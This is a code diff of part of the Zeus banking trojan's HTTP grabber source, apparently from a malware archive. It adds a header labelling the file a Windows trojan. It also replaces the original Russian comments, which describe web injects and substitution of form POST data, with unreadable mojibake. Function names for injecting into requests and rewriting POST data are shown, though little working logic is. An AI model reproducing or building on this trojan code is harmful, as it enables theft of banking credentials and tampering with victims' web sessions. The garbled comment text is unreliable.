@@ -1,3 +1,14 @@
+/*
+  name      Zeus
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <shlwapi.h>
 #include <wininet.h>
@@ -269,12 +280,12 @@ bool HttpGrabber::_isUrlInList(DWORD listId, const BinStorage::STORAGE *localCon
 }
 
 /*
-  Проверка запроса на необходимость инждекта.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN OUT requestData - запрос.
+  IN OUT requestData - пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return             - true - инжекты применины,
-                       false - инжекты не применены
+  Return             - true - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+                       false - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 */
 static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
 {
@@ -427,12 +438,12 @@ SKIP_ITEM:;
 }
 
 /*
-  Замена POST-данных "application/x-www-form-urlencoded".
+  пїЅпїЅпїЅпїЅпїЅпїЅ POST-пїЅпїЅпїЅпїЅпїЅпїЅ "application/x-www-form-urlencoded".
 
-  IN OUT requestData - запрос.
+  IN OUT requestData - пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return             - true - данные заменены,
-                       false - данные не заменены.
+  Return             - true - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+                       false - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool replacePostData(HttpGrabber::REQUESTDATA *requestData)
 {
@@ -543,7 +554,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
 #endif
 
   DWORD retVal = 0;
-  signed char writeReport = -1;/*-1 - по умолчанию, 0 - не писать, 1 - принудительно писать*/;
+  signed char writeReport = -1;/*-1 - пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, 0 - пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, 1 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ*/;
 
   //Check for blockage.
   CWA(kernel32, EnterCriticalSection)(&blockInjectInfo.cs);
